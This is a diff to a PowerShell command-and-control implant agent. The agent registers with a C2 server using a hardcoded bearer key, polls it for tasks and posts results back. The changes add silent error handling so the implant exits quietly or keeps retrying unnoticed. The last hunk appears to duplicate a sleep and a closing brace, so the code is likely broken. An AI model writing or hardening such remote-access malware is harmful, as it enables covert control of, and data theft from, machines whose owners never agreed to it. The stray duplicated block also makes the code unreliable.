@@ -4,16 +4,28 @@ $auth = "MySecretKey123"
 $POLL_INTERVAL = 2
 
 # Register agent
-$response = Invoke-RestMethod -Uri "$C2_SERVER_IP/register" -Method Post -Headers @{Authorization="Bearer $auth"}
-$agent_id = $response.agent_id
+try {
+    $response = Invoke-RestMethod -Uri "$C2_SERVER_IP/register" -Method Post -Headers @{Authorization="Bearer $auth"} -ErrorAction Stop
+    $agent_id = $response.agent_id
+} catch {
+    exit
+}
 
 function Send-Result($content) {
-    Invoke-RestMethod -Uri "$C2_SERVER_IP/result/$agent_id" -Method Post -Body $content -Headers @{Authorization="Bearer $auth"}
+    try {
+        Invoke-RestMethod -Uri "$C2_SERVER_IP/result/$agent_id" -Method Post -Body $content -Headers @{Authorization="Bearer $auth"} -ErrorAction Stop
+    } catch {
+    }
 }
 
 while ($true) {
-    $taskResponse = Invoke-RestMethod -Uri "$C2_SERVER_IP/task/$agent_id" -Method Get -Headers @{Authorization="Bearer $auth"}
-    $task = $taskResponse.task
+    try {
+        $taskResponse = Invoke-RestMethod -Uri "$C2_SERVER_IP/task/$agent_id" -Method Get -Headers @{Authorization="Bearer $auth"} -ErrorAction Stop
+        $task = $taskResponse.task
+    } catch {
+        Start-Sleep -Seconds $POLL_INTERVAL
+        continue
+    }
 
     if ($task -and $task -ne "null") {
         try {
@@ -54,6 +66,10 @@ while ($true) {
             Send-Result "[ERROR] $_"
         }
     }
+
+    Start-Sleep -Seconds $POLL_INTERVAL
+}
+
 
     Start-Sleep -Seconds $POLL_INTERVAL
 }
